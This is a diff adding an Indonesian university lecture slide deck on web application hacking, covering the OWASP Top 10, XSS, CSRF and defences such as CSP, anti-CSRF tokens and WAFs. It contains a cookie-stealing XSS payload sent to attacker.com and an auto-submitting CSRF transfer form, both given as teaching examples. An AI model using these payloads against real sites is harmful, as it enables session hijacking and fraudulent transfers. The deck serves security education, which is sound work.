@@ -1,0 +1,1241 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Pertemuan 11: Web Server & Web Application Hacking</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/reveal.js/4.5.0/reveal.min.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/reveal.js/4.5.0/theme/white.min.css">
+    <style>
+        :root {
+            --primary-color: #2c3e50;
+            --secondary-color: #3498db;
+            --accent-color: #e74c3c;
+            --success-color: #27ae60;
+            --warning-color: #f39c12;
+        }
+
+        .reveal {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+
+        .reveal h1 {
+            color: var(--primary-color);
+            text-transform: none;
+            font-size: 2.5em;
+            margin-bottom: 0.5em;
+        }
+
+        .reveal h2 {
+            color: var(--secondary-color);
+            text-transform: none;
+            font-size: 1.8em;
+            margin-bottom: 0.5em;
+        }
+
+        .reveal h3 {
+            color: var(--primary-color);
+            text-transform: none;
+            font-size: 1.3em;
+        }
+
+        .reveal p, .reveal li {
+            font-size: 0.9em;
+            line-height: 1.6;
+        }
+
+        /* Custom boxes */
+        .info-box {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            padding: 20px;
+            border-radius: 15px;
+            margin: 20px 0;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.2);
+        }
+
+        .warning-box {
+            background: linear-gradient(135deg, #f093fb 0%, #f5576c 100%);
+            color: white;
+            padding: 20px;
+            border-radius: 15px;
+            margin: 20px 0;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.2);
+        }
+
+        .success-box {
+            background: linear-gradient(135deg, #4facfe 0%, #00f2fe 100%);
+            color: white;
+            padding: 20px;
+            border-radius: 15px;
+            margin: 20px 0;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.2);
+        }
+
+        .danger-box {
+            background: linear-gradient(135deg, #fa709a 0%, #fee140 100%);
+            color: #333;
+            padding: 20px;
+            border-radius: 15px;
+            margin: 20px 0;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.2);
+            font-weight: bold;
+        }
+
+        /* Icon styles */
+        .big-icon {
+            font-size: 5em;
+            margin: 20px;
+        }
+
+        .medium-icon {
+            font-size: 3em;
+            margin: 10px;
+        }
+
+        /* Grid layout */
+        .grid-2 {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 30px;
+            align-items: center;
+        }
+
+        .grid-3 {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 20px;
+        }
+
+        /* Card styles */
+        .card {
+            background: white;
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.1);
+            transition: transform 0.3s;
+        }
+
+        .card:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 6px 20px rgba(0,0,0,0.15);
+        }
+
+        .card-header {
+            font-weight: bold;
+            color: var(--secondary-color);
+            font-size: 1.2em;
+            margin-bottom: 10px;
+        }
+
+        /* Attack flow */
+        .attack-step {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            padding: 15px;
+            border-radius: 10px;
+            margin: 10px 0;
+            position: relative;
+        }
+
+        .attack-step::before {
+            content: "➡";
+            position: absolute;
+            left: -30px;
+            font-size: 1.5em;
+        }
+
+        .attack-step:first-child::before {
+            content: "🎯";
+        }
+
+        /* Number badges */
+        .number-badge {
+            display: inline-block;
+            width: 40px;
+            height: 40px;
+            background: var(--accent-color);
+            color: white;
+            border-radius: 50%;
+            line-height: 40px;
+            text-align: center;
+            font-weight: bold;
+            margin-right: 10px;
+        }
+
+        /* Code block styling */
+        .code-block {
+            background: #2d2d2d;
+            color: #f8f8f2;
+            padding: 20px;
+            border-radius: 10px;
+            font-family: 'Courier New', monospace;
+            font-size: 0.8em;
+            text-align: left;
+            margin: 20px 0;
+        }
+
+        .code-comment {
+            color: #75715e;
+        }
+
+        .code-string {
+            color: #e6db74;
+        }
+
+        .code-keyword {
+            color: #66d9ef;
+        }
+
+        /* Timeline */
+        .timeline-item {
+            display: flex;
+            align-items: center;
+            margin: 20px 0;
+        }
+
+        .timeline-dot {
+            width: 20px;
+            height: 20px;
+            background: var(--secondary-color);
+            border-radius: 50%;
+            margin-right: 20px;
+        }
+
+        /* Comparison table */
+        .comparison-table {
+            width: 100%;
+            border-collapse: collapse;
+            margin: 20px 0;
+        }
+
+        .comparison-table th {
+            background: var(--secondary-color);
+            color: white;
+            padding: 15px;
+        }
+
+        .comparison-table td {
+            padding: 12px;
+            border: 1px solid #ddd;
+        }
+
+        .comparison-table tr:nth-child(even) {
+            background: #f8f9fa;
+        }
+
+        /* Defense layers */
+        .defense-layer {
+            margin: 15px 0;
+            padding: 15px;
+            border-left: 5px solid var(--success-color);
+            background: #f0f9f4;
+            border-radius: 5px;
+        }
+
+        /* Highlight text */
+        .highlight {
+            background: linear-gradient(120deg, #84fab0 0%, #8fd3f4 100%);
+            padding: 3px 8px;
+            border-radius: 5px;
+            font-weight: bold;
+        }
+
+        .highlight-danger {
+            background: linear-gradient(120deg, #fa709a 0%, #fee140 100%);
+            padding: 3px 8px;
+            border-radius: 5px;
+            font-weight: bold;
+        }
+
+        /* Stats display */
+        .stat-box {
+            text-align: center;
+            padding: 20px;
+        }
+
+        .stat-number {
+            font-size: 3em;
+            font-weight: bold;
+            color: var(--accent-color);
+            display: block;
+        }
+
+        .stat-label {
+            font-size: 0.9em;
+            color: #666;
+        }
+
+        /* Process arrows */
+        .process-flow {
+            display: flex;
+            justify-content: space-around;
+            align-items: center;
+            margin: 30px 0;
+        }
+
+        .process-step {
+            flex: 1;
+            text-align: center;
+            position: relative;
+        }
+
+        .process-step:not(:last-child)::after {
+            content: "→";
+            position: absolute;
+            right: -20px;
+            font-size: 2em;
+            color: var(--secondary-color);
+        }
+
+        /* Emoji size */
+        .emoji {
+            font-size: 1.5em;
+        }
+
+        /* Fragment highlight */
+        .reveal .fragment.highlight-current-blue.visible.current-fragment {
+            color: var(--secondary-color);
+        }
+
+        /* Custom list styles */
+        .reveal ul.custom-list {
+            list-style: none;
+        }
+
+        .reveal ul.custom-list li::before {
+            content: "✓ ";
+            color: var(--success-color);
+            font-weight: bold;
+            font-size: 1.2em;
+            margin-right: 10px;
+        }
+
+        .reveal ul.danger-list li::before {
+            content: "⚠ ";
+            color: var(--accent-color);
+        }
+
+        /* Footer */
+        .slide-footer {
+            position: absolute;
+            bottom: 20px;
+            left: 20px;
+            font-size: 0.6em;
+            color: #999;
+        }
+
+        /* Title slide special styling */
+        .title-slide {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white !important;
+        }
+
+        .title-slide h1, .title-slide h2, .title-slide p {
+            color: white !important;
+        }
+    </style>
+</head>
+<body>
+    <div class="reveal">
+        <div class="slides">
+            
+            <!-- Slide 1: Title -->
+            <section class="title-slide">
+                <h1>🌐 Web Server & Web Application Hacking</h1>
+                <h2>Pertemuan 11</h2>
+                <p>Pengantar Keamanan Siber</p>
+                <p style="margin-top: 50px; font-size: 0.8em;">
+                    Program Studi Teknik Informatika<br>
+                    Universitas Pertahanan RI
+                </p>
+            </section>
+
+            <!-- Slide 2: Agenda -->
+            <section>
+                <h2>📋 Agenda Hari Ini</h2>
+                <div class="grid-2">
+                    <div>
+                        <ul class="custom-list" style="font-size: 0.85em;">
+                            <li>Pengenalan Web Server</li>
+                            <li>Kerentanan Web Server</li>
+                            <li>OWASP Top 10</li>
+                            <li>Cross-Site Scripting (XSS)</li>
+                        </ul>
+                    </div>
+                    <div>
+                        <ul class="custom-list" style="font-size: 0.85em;">
+                            <li>Cross-Site Request Forgery (CSRF)</li>
+                            <li>Strategi Pengamanan</li>
+                            <li>Defense in Depth</li>
+                            <li>Best Practices</li>
+                        </ul>
+                    </div>
+                </div>
+            </section>
+
+            <!-- Slide 3: Apa itu Web Server? -->
+            <section>
+                <h2>🖥️ Apa Itu Web Server?</h2>
+                <div class="info-box">
+                    <h3 style="color: white; margin-top: 0;">Definisi Sederhana</h3>
+                    <p style="font-size: 1.1em;">
+                        Web server adalah <span class="highlight">perangkat lunak pelayan</span> yang menerima permintaan dari browser Anda dan mengirimkan halaman web kembali.
+                    </p>
+                </div>
+                <div class="grid-2" style="margin-top: 30px;">
+                    <div class="card">
+                        <div class="card-header">🍽️ Analogi Restoran</div>
+                        <p><strong>Browser</strong> = Pelanggan</p>
+                        <p><strong>Web Server</strong> = Pelayan</p>
+                        <p><strong>Database</strong> = Dapur</p>
+                    </div>
+                    <div class="card">
+                        <div class="card-header">📦 Contoh Web Server</div>
+                        <p>• Apache HTTP Server</p>
+                        <p>• Nginx</p>
+                        <p>• Microsoft IIS</p>
+                        <p>• LiteSpeed</p>
+                    </div>
+                </div>
+            </section>
+
+            <!-- Slide 4: Arsitektur Web -->
+            <section>
+                <h2>🏗️ Arsitektur Sistem Web</h2>
+                <div class="process-flow">
+                    <div class="process-step">
+                        <div class="big-icon">💻</div>
+                        <div><strong>Browser</strong></div>
+                        <div style="font-size: 0.8em;">Client Side</div>
+                    </div>
+                    <div class="process-step">
+                        <div class="big-icon">🌐</div>
+                        <div><strong>Internet</strong></div>
+                        <div style="font-size: 0.8em;">HTTP/HTTPS</div>
+                    </div>
+                    <div class="process-step">
+                        <div class="big-icon">🖥️</div>
+                        <div><strong>Web Server</strong></div>
+                        <div style="font-size: 0.8em;">Server Side</div>
+                    </div>
+                    <div class="process-step">
+                        <div class="big-icon">🗄️</div>
+                        <div><strong>Database</strong></div>
+                        <div style="font-size: 0.8em;">Data Storage</div>
+                    </div>
+                </div>
+                <div class="success-box" style="margin-top: 40px;">
+                    <p style="margin: 0;"><strong>Alur:</strong> Browser mengirim Request → Server memproses → Database mengambil data → Server mengirim Response → Browser menampilkan</p>
+                </div>
+            </section>
+
+            <!-- Slide 5: HTTP Request-Response -->
+            <section>
+                <h2>📨 Cara Kerja HTTP</h2>
+                <div class="timeline-item">
+                    <div class="timeline-dot"></div>
+                    <div><span class="number-badge">1</span> <strong>User mengetik URL</strong> di browser</div>
+                </div>
+                <div class="timeline-item">
+                    <div class="timeline-dot"></div>
+                    <div><span class="number-badge">2</span> <strong>Browser membuat HTTP Request</strong></div>
+                </div>
+                <div class="timeline-item">
+                    <div class="timeline-dot"></div>
+                    <div><span class="number-badge">3</span> <strong>Server menerima dan memproses</strong> request</div>
+                </div>
+                <div class="timeline-item">
+                    <div class="timeline-dot"></div>
+                    <div><span class="number-badge">4</span> <strong>Server mengirim HTTP Response</strong></div>
+                </div>
+                <div class="timeline-item">
+                    <div class="timeline-dot"></div>
+                    <div><span class="number-badge">5</span> <strong>Browser menampilkan</strong> halaman web</div>
+                </div>
+            </section>
+
+            <!-- Slide 6: Mengapa Keamanan Web Penting? -->
+            <section>
+                <h2>🔒 Mengapa Keamanan Web Penting?</h2>
+                <div class="grid-3">
+                    <div class="stat-box">
+                        <span class="stat-number">80%</span>
+                        <span class="stat-label">Aplikasi web memiliki kerentanan</span>
+                    </div>
+                    <div class="stat-box">
+                        <span class="stat-number">43%</span>
+                        <span class="stat-label">Serangan target website</span>
+                    </div>
+                    <div class="stat-box">
+                        <span class="stat-number">$4.5M</span>
+                        <span class="stat-label">Rata-rata biaya data breach</span>
+                    </div>
+                </div>
+                <div class="danger-box" style="margin-top: 40px;">
+                    <p style="margin: 0;">⚠️ Web server harus TERBUKA ke internet → Mudah diserang!</p>
+                </div>
+            </section>
+
+            <!-- Slide 7: Kerentanan Umum -->
+            <section>
+                <h2>🐛 Kerentanan Umum Web Server</h2>
+                <div class="grid-2">
+                    <div class="card">
+                        <div class="card-header">⚙️ Misconfiguration</div>
+                        <ul style="font-size: 0.85em; text-align: left;">
+                            <li>Konfigurasi default tidak aman</li>
+                            <li>Directory listing aktif</li>
+                            <li>Error message terlalu detail</li>
+                            <li>Password default tidak diubah</li>
+                        </ul>
+                    </div>
+                    <div class="card">
+                        <div class="card-header">🔄 Outdated Software</div>
+                        <ul style="font-size: 0.85em; text-align: left;">
+                            <li>Software tidak di-update</li>
+                            <li>Patch keamanan belum diinstal</li>
+                            <li>Kerentanan sudah dipublikasi</li>
+                            <li>Exploit tersedia publik</li>
+                        </ul>
+                    </div>
+                </div>
+                <div class="grid-2" style="margin-top: 20px;">
+                    <div class="card">
+                        <div class="card-header">🔑 Weak Authentication</div>
+                        <ul style="font-size: 0.85em; text-align: left;">
+                            <li>Password lemah/mudah ditebak</li>
+                            <li>Tidak ada rate limiting</li>
+                            <li>Tidak ada MFA</li>
+                            <li>Session management buruk</li>
+                        </ul>
+                    </div>
+                    <div class="card">
+                        <div class="card-header">📁 Directory Traversal</div>
+                        <ul style="font-size: 0.85em; text-align: left;">
+                            <li>Akses file di luar web root</li>
+                            <li>Manipulasi path dengan ../</li>
+                            <li>Baca file konfigurasi</li>
+                            <li>Akses file sistem</li>
+                        </ul>
+                    </div>
+                </div>
+            </section>
+
+            <!-- Slide 8: OWASP Top 10 Intro -->
+            <section>
+                <h2>🏆 OWASP Top 10</h2>
+                <div class="info-box">
+                    <h3 style="color: white; margin-top: 0;">Apa itu OWASP?</h3>
+                    <p><strong>Open Web Application Security Project</strong></p>
+                    <p>Organisasi nonprofit yang fokus pada keamanan aplikasi web</p>
+                </div>
+                <div class="success-box">
+                    <h3 style="margin-top: 0;">OWASP Top 10 - Versi 2021</h3>
+                    <p>Daftar <span class="highlight">10 risiko keamanan paling kritis</span> pada aplikasi web, diperbarui setiap 3-4 tahun berdasarkan data dari ribuan aplikasi.</p>
+                </div>
+            </section>
+
+            <!-- Slide 9: OWASP Top 10 List -->
+            <section>
+                <h2>📊 OWASP Top 10 - 2021</h2>
+                <div style="font-size: 0.75em;">
+                    <div class="grid-2">
+                        <div>
+                            <div class="attack-step" style="margin-left: 30px;">
+                                <strong>1. Broken Access Control</strong><br>
+                                Pengguna bisa akses yang tidak seharusnya
+                            </div>
+                            <div class="attack-step" style="margin-left: 30px;">
+                                <strong>2. Cryptographic Failures</strong><br>
+                                Gagal melindungi data sensitif
+                            </div>
+                            <div class="attack-step" style="margin-left: 30px;">
+                                <strong>3. Injection</strong><br>
+                                Input berbahaya dieksekusi
+                            </div>
+                            <div class="attack-step" style="margin-left: 30px;">
+                                <strong>4. Insecure Design</strong><br>
+                                Kelemahan di fase desain
+                            </div>
+                            <div class="attack-step" style="margin-left: 30px;">
+                                <strong>5. Security Misconfiguration</strong><br>
+                                Konfigurasi tidak aman
+                            </div>
+                        </div>
+                        <div>
+                            <div class="attack-step" style="margin-left: 30px;">
+                                <strong>6. Vulnerable Components</strong><br>
+                                Komponen dengan kerentanan
+                            </div>
+                            <div class="attack-step" style="margin-left: 30px;">
+                                <strong>7. Auth Failures</strong><br>
+                                Kelemahan autentikasi
+                            </div>
+                            <div class="attack-step" style="margin-left: 30px;">
+                                <strong>8. Data Integrity Failures</strong><br>
+                                Tidak ada verifikasi integritas
+                            </div>
+                            <div class="attack-step" style="margin-left: 30px;">
+                                <strong>9. Logging Failures</strong><br>
+                                Logging tidak memadai
+                            </div>
+                            <div class="attack-step" style="margin-left: 30px;">
+                                <strong>10. SSRF</strong><br>
+                                Server-Side Request Forgery
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </section>
+
+            <!-- Slide 10: XSS Introduction -->
+            <section>
+                <h2>⚡ Cross-Site Scripting (XSS)</h2>
+                <div class="warning-box">
+                    <h3 style="color: white; margin-top: 0;">Apa itu XSS?</h3>
+                    <p style="font-size: 1.1em;">
+                        Serangan yang <span class="highlight-danger">menyuntikkan script berbahaya</span> (biasanya JavaScript) ke dalam halaman web yang dilihat pengguna lain.
+                    </p>
+                </div>
+                <div class="grid-2" style="margin-top: 30px;">
+                    <div>
+                        <div class="card">
+                            <div class="card-header">😱 Mengapa Bahaya?</div>
+                            <ul style="text-align: left; font-size: 0.85em;">
+                                <li>Mencuri session cookie</li>
+                                <li>Phishing dalam site asli</li>
+                                <li>Keylogging</li>
+                                <li>Defacement</li>
+                            </ul>
+                        </div>
+                    </div>
+                    <div>
+                        <div class="card">
+                            <div class="card-header">📈 Statistik</div>
+                            <ul style="text-align: left; font-size: 0.85em;">
+                                <li>50-80% aplikasi rentan XSS</li>
+                                <li>Salah satu yang paling umum</li>
+                                <li>Mudah dieksploitasi</li>
+                                <li>Dampak sangat signifikan</li>
+                            </ul>
+                        </div>
+                    </div>
+                </div>
+            </section>
+
+            <!-- Slide 11: XSS Types -->
+            <section>
+                <h2>🎯 3 Tipe XSS</h2>
+                <div class="grid-3" style="font-size: 0.8em;">
+                    <div class="card">
+                        <div class="card-header" style="background: #f39c12; color: white; padding: 10px; border-radius: 5px;">1. Reflected XSS</div>
+                        <p><strong>Non-Persistent</strong></p>
+                        <p>Script di-reflect dari server</p>
+                        <div style="margin: 15px 0; padding: 10px; background: #fff3cd; border-radius: 5px;">
+                            <p style="margin: 5px 0;">✓ Melalui URL/link</p>
+                            <p style="margin: 5px 0;">✓ Butuh social engineering</p>
+                            <p style="margin: 5px 0;">✓ Tidak disimpan</p>
+                        </div>
+                    </div>
+                    <div class="card">
+                        <div class="card-header" style="background: #e74c3c; color: white; padding: 10px; border-radius: 5px;">2. Stored XSS</div>
+                        <p><strong>Persistent</strong></p>
+                        <p>Script disimpan di server</p>
+                        <div style="margin: 15px 0; padding: 10px; background: #f8d7da; border-radius: 5px;">
+                            <p style="margin: 5px 0;">✓ Paling berbahaya</p>
+                            <p style="margin: 5px 0;">✓ Otomatis menyerang</p>
+                            <p style="margin: 5px 0;">✓ Disimpan di database</p>
+                        </div>
+                    </div>
+                    <div class="card">
+                        <div class="card-header" style="background: #3498db; color: white; padding: 10px; border-radius: 5px;">3. DOM-based XSS</div>
+                        <p><strong>Client-Side</strong></p>
+                        <p>Script eksekusi di browser</p>
+                        <div style="margin: 15px 0; padding: 10px; background: #d1ecf1; border-radius: 5px;">
+                            <p style="margin: 5px 0;">✓ Tidak ke server</p>
+                            <p style="margin: 5px 0;">✓ Sulit dideteksi</p>
+                            <p style="margin: 5px 0;">✓ Manipulasi DOM</p>
+                        </div>
+                    </div>
+                </div>
+            </section>
+
+            <!-- Slide 12: XSS Example -->
+            <section>
+                <h2>💻 Contoh Serangan Reflected XSS</h2>
+                <div class="code-block">
+                    <div class="code-comment">// Website dengan fitur pencarian vulnerable</div>
+                    <div>http://contoh.com/search?<span class="code-keyword">q</span>=<span class="code-string">laptop</span></div>
+                    <div class="code-comment">// Halaman menampilkan: "Hasil pencarian untuk: laptop"</div>
+                    <br>
+                    <div class="code-comment">// Penyerang membuat URL berbahaya:</div>
+                    <div>http://contoh.com/search?<span class="code-keyword">q</span>=<span class="code-string">&lt;script&gt;alert('XSS')&lt;/script&gt;</span></div>
+                    <br>
+                    <div class="code-comment">// Ketika korban klik link, script dieksekusi!</div>
+                    <div><span class="code-keyword">&lt;script&gt;</span></div>
+                    <div>  document.location='http://attacker.com/?cookie=' + document.cookie;</div>
+                    <div><span class="code-keyword">&lt;/script&gt;</span></div>
+                </div>
+                <div class="danger-box" style="margin-top: 20px;">
+                    <p style="margin: 0;">⚠️ Cookie session korban terkirim ke penyerang!</p>
+                </div>
+            </section>
+
+            <!-- Slide 13: Mencegah XSS -->
+            <section>
+                <h2>🛡️ Cara Mencegah XSS</h2>
+                <div class="defense-layer">
+                    <strong>1. Input Validation</strong><br>
+                    Validasi semua input dari user dengan whitelist
+                </div>
+                <div class="defense-layer">
+                    <strong>2. Output Encoding</strong><br>
+                    Encode karakter khusus: &lt; menjadi &amp;lt;, &gt; menjadi &amp;gt;
+                </div>
+                <div class="defense-layer">
+                    <strong>3. Content Security Policy (CSP)</strong><br>
+                    Header yang membatasi sumber script yang boleh dieksekusi
+                </div>
+                <div class="defense-layer">
+                    <strong>4. HTTPOnly Cookies</strong><br>
+                    Cookie tidak bisa diakses oleh JavaScript
+                </div>
+                <div class="defense-layer">
+                    <strong>5. Gunakan Framework Modern</strong><br>
+                    React, Angular, Vue.js sudah auto-escape output
+                </div>
+            </section>
+
+            <!-- Slide 14: CSRF Introduction -->
+            <section>
+                <h2>🎭 Cross-Site Request Forgery (CSRF)</h2>
+                <div class="warning-box">
+                    <h3 style="color: white; margin-top: 0;">Apa itu CSRF?</h3>
+                    <p style="font-size: 1.1em;">
+                        Serangan yang <span class="highlight-danger">memaksa pengguna</span> yang sudah login untuk melakukan aksi yang tidak diinginkan tanpa sepengetahuan mereka.
+                    </p>
+                </div>
+                <div class="info-box" style="margin-top: 20px;">
+                    <h3 style="color: white; margin-top: 0;">🔑 Kunci CSRF</h3>
+                    <p>Browser secara <strong>OTOMATIS</strong> mengirim cookie pada setiap request ke domain yang sama, bahkan jika request dibuat dari website lain!</p>
+                </div>
+            </section>
+
+            <!-- Slide 15: CSRF Attack Flow -->
+            <section>
+                <h2>⚔️ Alur Serangan CSRF</h2>
+                <div style="font-size: 0.85em;">
+                    <div class="attack-step" style="margin-left: 30px; background: linear-gradient(135deg, #4facfe 0%, #00f2fe 100%);">
+                        <strong>0️⃣ Setup:</strong> Korban sudah login ke bank.com → Cookie tersimpan di browser
+                    </div>
+                    <div class="attack-step" style="margin-left: 30px; background: linear-gradient(135deg, #f093fb 0%, #f5576c 100%);">
+                        <strong>1️⃣ Penyerang:</strong> Membuat halaman jahat dengan form transfer dana
+                    </div>
+                    <div class="attack-step" style="margin-left: 30px; background: linear-gradient(135deg, #fa709a 0%, #fee140 100%); color: #333;">
+                        <strong>2️⃣ Korban:</strong> Mengklik link berbahaya (email phishing)
+                    </div>
+                    <div class="attack-step" style="margin-left: 30px; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);">
+                        <strong>3️⃣ Browser:</strong> Auto-submit form + cookie valid terkirim ke bank.com
+                    </div>
+                    <div class="attack-step" style="margin-left: 30px; background: linear-gradient(135deg, #fa709a 0%, #fee140 100%); color: #333;">
+                        <strong>4️⃣ Server Bank:</strong> "Cookie valid? OK, proses transfer!" ✅
+                    </div>
+                    <div class="attack-step" style="margin-left: 30px; background: linear-gradient(135deg, #f093fb 0%, #f5576c 100%);">
+                        <strong>5️⃣ Hasil:</strong> Dana ditransfer tanpa sepengetahuan korban! 💸
+                    </div>
+                </div>
+            </section>
+
+            <!-- Slide 16: CSRF Example -->
+            <section>
+                <h2>💻 Contoh Kode CSRF Attack</h2>
+                <div class="code-block">
+                    <div class="code-comment">&lt;!-- Halaman berbahaya yang dibuat penyerang --&gt;</div>
+                    <div><span class="code-keyword">&lt;html&gt;</span></div>
+                    <div><span class="code-keyword">&lt;body&gt;</span></div>
+                    <div>  <span class="code-keyword">&lt;h1&gt;</span>Selamat! Anda Menang Hadiah!<span class="code-keyword">&lt;/h1&gt;</span></div>
+                    <br>
+                    <div class="code-comment">  &lt;!-- Form tersembunyi yang auto-submit --&gt;</div>
+                    <div>  <span class="code-keyword">&lt;form</span> action=<span class="code-string">"http://bank.com/transfer"</span> method=<span class="code-string">"POST"</span><span class="code-keyword">&gt;</span></div>
+                    <div>    <span class="code-keyword">&lt;input</span> type=<span class="code-string">"hidden"</span> name=<span class="code-string">"to"</span> value=<span class="code-string">"attacker"</span><span class="code-keyword">/&gt;</span></div>
+                    <div>    <span class="code-keyword">&lt;input</span> type=<span class="code-string">"hidden"</span> name=<span class="code-string">"amount"</span> value=<span class="code-string">"1000000"</span><span class="code-keyword">/&gt;</span></div>
+                    <div>  <span class="code-keyword">&lt;/form&gt;</span></div>
+                    <br>
+                    <div>  <span class="code-keyword">&lt;script&gt;</span></div>
+                    <div>    document.forms[0].submit(); <span class="code-comment">// Auto-submit!</span></div>
+                    <div>  <span class="code-keyword">&lt;/script&gt;</span></div>
+                    <div><span class="code-keyword">&lt;/body&gt;</span></div>
+                    <div><span class="code-keyword">&lt;/html&gt;</span></div>
+                </div>
+            </section>
+
+            <!-- Slide 17: Mencegah CSRF -->
+            <section>
+                <h2>🛡️ Cara Mencegah CSRF</h2>
+                <div class="defense-layer">
+                    <strong>1. Anti-CSRF Token</strong><br>
+                    Token unik untuk setiap request/session yang di-validate server
+                </div>
+                <div class="defense-layer">
+                    <strong>2. SameSite Cookie Attribute</strong><br>
+                    Cookie tidak dikirim pada cross-site request (SameSite=Strict/Lax)
+                </div>
+                <div class="defense-layer">
+                    <strong>3. Double Submit Cookie</strong><br>
+                    Token disimpan di cookie DAN parameter request
+                </div>
+                <div class="defense-layer">
+                    <strong>4. Re-authentication</strong><br>
+                    Minta password lagi untuk aksi sensitif (transfer dana, ubah password)
+                </div>
+                <div class="defense-layer">
+                    <strong>5. Check Referer Header</strong><br>
+                    Validasi bahwa request berasal dari domain yang benar
+                </div>
+            </section>
+
+            <!-- Slide 18: XSS vs CSRF Comparison -->
+            <section>
+                <h2>⚔️ XSS vs CSRF</h2>
+                <table class="comparison-table" style="font-size: 0.75em;">
+                    <thead>
+                        <tr>
+                            <th>Aspek</th>
+                            <th>XSS</th>
+                            <th>CSRF</th>
+                        </tr>
+                    </thead>
+                    <tbody>
+                        <tr>
+                            <td><strong>Target</strong></td>
+                            <td>Pengguna (eksekusi script)</td>
+                            <td>Aplikasi (eksekusi aksi)</td>
+                        </tr>
+                        <tr>
+                            <td><strong>Memanfaatkan</strong></td>
+                            <td>Kepercayaan user ke website</td>
+                            <td>Kepercayaan website ke browser</td>
+                        </tr>
+                        <tr>
+                            <td><strong>Eksekusi</strong></td>
+                            <td>Script di browser korban</td>
+                            <td>Request atas nama korban</td>
+                        </tr>
+                        <tr>
+                            <td><strong>Butuh Login?</strong></td>
+                            <td>Tidak wajib</td>
+                            <td>Ya, harus sudah login</td>
+                        </tr>
+                        <tr>
+                            <td><strong>Pencegahan Utama</strong></td>
+                            <td>Output encoding, CSP</td>
+                            <td>Anti-CSRF token</td>
+                        </tr>
+                    </tbody>
+                </table>
+            </section>
+
+            <!-- Slide 19: Defense in Depth -->
+            <section>
+                <h2>🏰 Defense in Depth</h2>
+                <div class="info-box">
+                    <h3 style="color: white; margin-top: 0;">Konsep Pertahanan Berlapis</h3>
+                    <p>Jangan bergantung pada SATU mekanisme keamanan saja. Gunakan <strong>MULTIPLE LAYERS</strong> untuk melindungi aplikasi.</p>
+                </div>
+                <div style="text-align: center; margin-top: 30px;">
+                    <div class="big-icon">🎯</div>
+                    <p style="font-size: 0.9em;">Aplikasi Web (pusat)</p>
+                    <div style="font-size: 0.85em; line-height: 2;">
+                        <div>↓</div>
+                        <div>🔒 Layer 6: Server Hardening</div>
+                        <div>↓</div>
+                        <div>🔒 Layer 5: Network Security (Firewall, IDS/IPS)</div>
+                        <div>↓</div>
+                        <div>🔒 Layer 4: Security Headers (CSP, HSTS)</div>
+                        <div>↓</div>
+                        <div>🔒 Layer 3: Web Application Firewall</div>
+                        <div>↓</div>
+                        <div>🔒 Layer 2: Authentication & Authorization</div>
+                        <div>↓</div>
+                        <div>🔒 Layer 1: Secure Coding</div>
+                    </div>
+                </div>
+            </section>
+
+            <!-- Slide 20: Security Headers -->
+            <section>
+                <h2>📋 Security Headers Penting</h2>
+                <div class="grid-2" style="font-size: 0.8em;">
+                    <div class="card">
+                        <div class="card-header">Content-Security-Policy</div>
+                        <p>Membatasi sumber script yang boleh diload</p>
+                        <div class="code-block" style="font-size: 0.7em;">
+                            Content-Security-Policy:<br>
+                            default-src 'self';<br>
+                            script-src 'self' cdn.com
+                        </div>
+                    </div>
+                    <div class="card">
+                        <div class="card-header">Strict-Transport-Security</div>
+                        <p>Paksa penggunaan HTTPS</p>
+                        <div class="code-block" style="font-size: 0.7em;">
+                            Strict-Transport-Security:<br>
+                            max-age=31536000;<br>
+                            includeSubDomains
+                        </div>
+                    </div>
+                    <div class="card">
+                        <div class="card-header">X-Frame-Options</div>
+                        <p>Cegah clickjacking</p>
+                        <div class="code-block" style="font-size: 0.7em;">
+                            X-Frame-Options:<br>
+                            DENY
+                        </div>
+                    </div>
+                    <div class="card">
+                        <div class="card-header">X-Content-Type-Options</div>
+                        <p>Cegah MIME sniffing</p>
+                        <div class="code-block" style="font-size: 0.7em;">
+                            X-Content-Type-Options:<br>
+                            nosniff
+                        </div>
+                    </div>
+                </div>
+            </section>
+
+            <!-- Slide 21: Web Application Firewall -->
+            <section>
+                <h2>🔥 Web Application Firewall (WAF)</h2>
+                <div class="grid-2">
+                    <div>
+                        <div class="info-box">
+                            <h3 style="color: white; margin-top: 0;">Apa itu WAF?</h3>
+                            <p>Firewall khusus yang bekerja di <strong>layer aplikasi</strong> (layer 7 OSI) untuk filter HTTP traffic.</p>
+                        </div>
+                        <div class="success-box" style="margin-top: 20px;">
+                            <h3 style="margin-top: 0;">✓ Fungsi WAF</h3>
+                            <ul style="text-align: left; font-size: 0.85em;">
+                                <li>Block SQL Injection</li>
+                                <li>Block XSS attacks</li>
+                                <li>Rate limiting</li>
+                                <li>Bot detection</li>
+                            </ul>
+                        </div>
+                    </div>
+                    <div>
+                        <div class="process-flow" style="flex-direction: column;">
+                            <div class="process-step">
+                                <div class="medium-icon">👤</div>
+                                <div>User Request</div>
+                            </div>
+                            <div style="font-size: 2em;">↓</div>
+                            <div class="process-step">
+                                <div class="medium-icon">🔥</div>
+                                <div><strong>WAF</strong></div>
+                                <div style="font-size: 0.8em; color: #27ae60;">✓ Filter malicious</div>
+                            </div>
+                            <div style="font-size: 2em;">↓</div>
+                            <div class="process-step">
+                                <div class="medium-icon">🖥️</div>
+                                <div>Web Server</div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+                <div class="warning-box" style="margin-top: 20px;">
+                    <p style="margin: 0;">⚠️ WAF bukan pengganti secure coding! WAF adalah <strong>layer tambahan</strong>.</p>
+                </div>
+            </section>
+
